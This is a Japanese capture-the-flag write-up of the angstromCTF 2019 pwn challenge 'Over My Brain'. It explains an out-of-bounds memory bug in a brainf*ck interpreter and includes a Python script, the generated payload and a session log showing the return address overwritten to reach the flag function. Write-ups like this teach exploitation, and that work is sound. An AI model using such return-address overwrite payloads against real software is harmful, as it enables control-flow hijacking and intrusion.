# [pwn 150pts] Over My Brain - angstromCTF 2019
64bitでDEP以外無効です。
```
$ checksec over_my_brain
[*] 'over_my_brain'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```

brainf\*\*kのインタブリタです。
ローカル変数でメモリを管理しているのですが、この変数の範囲を超えて読み書きできます。
また、いつもどおりflag関数があるので、リターンアドレスをflagのアドレスに変えましょう。
ただし、送れるコードは144文字までなので、それ以内に収める必要があります。
リターンアドレスは結構先にあるので、大きくジャンプしなければなりません。
幸いにもインタプリタ用のメモリは0で初期化されているので、次のコードで大幅にジャンプできます。
```
+[>+]
```
やっていることは、今いる番地をインクリメントし、0でなければ次へ進んでインクリメントする、という処理の繰り返しです。
したがって、0xffが来るまではひたすらポインタが進みます。
あとは`[-]`でメモリを0に初期化できるので、リターンアドレスを書き換えます。

いろいろ工夫したら次のコードで144バイト以内に収まりました。

```python
addr_flag = 0x4011c6

def craft_write(c):
    b = int(c ** 0.5)
    payload = "+" * (c - b * b) + ">"
    payload += "[-]" + "+" * b
    payload += "[<" + "+" * b + ">-]"
    return payload

# jump to ret addr
payload = "+[>+]" + ">" * 0x28
# reset
payload += "[-]"
payload += craft_write((addr_flag >> 0) & 0xFF)
payload += craft_write((addr_flag >> 8) & 0xFF)
payload += craft_write((addr_flag >> 16) & 0xFF)
payload += ">[-]>[-]"

print(len(payload))

print(payload)
```

```
+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]++>[-]++++++++++++++[<++++++++++++++>-]+>[-]++++[<++++>-]>[-]++++++++[<++++++++>-]>[-]>[-]
```

```
$ nc shell.actf.co 19010
enter some brainf code: +[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[-]++>[-]++++++++++++++[<++++++++++++++>-]+>[-]++++[<++++>-]>[-]++++++++[<++++++++>-]>[-]>[-]
actf{whoooooooooooooooooooosh}
Segmentation fault (core dumped)
```

# 感想
ひさしぶりにbrainf\*\*kして面白かったです。
